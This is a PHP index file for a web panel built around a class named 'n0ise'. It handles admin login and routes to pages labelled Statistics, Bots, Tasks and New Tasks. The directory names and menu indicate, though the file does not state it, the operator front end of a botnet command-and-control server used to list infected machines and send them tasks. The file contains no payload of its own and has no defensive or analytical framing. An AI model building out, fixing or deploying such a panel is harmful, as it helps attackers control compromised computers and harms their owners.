<?php
session_start();
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Load class definition once
require_once '/var/www/html/Webpanel/_bot/inc/config.inc.php';
require_once '/var/www/html/Webpanel/_bot/func/tasks.php';


// Ensure the class isn't already defined
if (!class_exists('n0ise')) {
    die('Critical Error: n0ise class not found.');
}

// Create class instance
$_n0ise = new n0ise(); // The DB connection is now handled automatically in the constructor

// Load config and setup
include_once(__DIR__ . '/_bot/run.php');

// Load HTML template
$_n0ise->tpl = file_get_contents(__DIR__ . '/_bot/design.tpl');

// Login verification
$loggedIn = isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true;
$sessionPass = $_SESSION['admin_password'] ?? null;
$n0isePass = $_n0ise->admin_password ?? null;

if (
    !$loggedIn ||
    !is_string($sessionPass) ||
    !is_string($n0isePass) ||
    !hash_equals($n0isePass, $sessionPass)
) {
    include_once(__DIR__ . '/_bot/func/login.php');
    $_n0ise->func = new n0ise_func_login;
    $_n0ise->func->run();

    echo str_replace(
        ['{content}', '{navigation}'],
        [$_n0ise->func->content, 'Please login'],
        $_n0ise->tpl
    );
    exit;
}

// Load panel functions
include_once(__DIR__ . '/_bot/func/statisics.php');
include_once(__DIR__ . '/_bot/func/list.php');
include_once(__DIR__ . '/_bot/func/tasks.php');
include_once(__DIR__ . '/_bot/func/logout.php');

// Navigation
$navigation = [
    'Statistics' => '?action=statistics',
    'Bots'       => '?action=list',
    'Tasks'      => '?action=tasks',
    'Logout'     => '?action=logout',
    'New Tasks'     => '?action=tasks&new',

];

$nav = '';
foreach ($navigation as $name => $link) {
    $nav .= '<a href="' . htmlspecialchars($link) . '">' . htmlspecialchars($name) . '</a> ';
}

// Determine which action to run
$action = $_GET['action'] ?? 'statistics';

switch ($action) {
    case 'tasks':
        $_n0ise->func = new n0ise_func_tasks;
        break;
    case 'list':
        $_n0ise->func = new n0ise_func_list;
        break;
    case 'logout':
        $_n0ise->func = new n0ise_func_logout;
        break;
    default:
        $_n0ise->func = new n0ise_func_statistics;
        break;
}

// Execute the function and render the output
$_n0ise->func->run();

echo str_replace(
    ['{content}', '{navigation}'],
    [$_n0ise->func->content, $nav],
    $_n0ise->tpl
);
?>
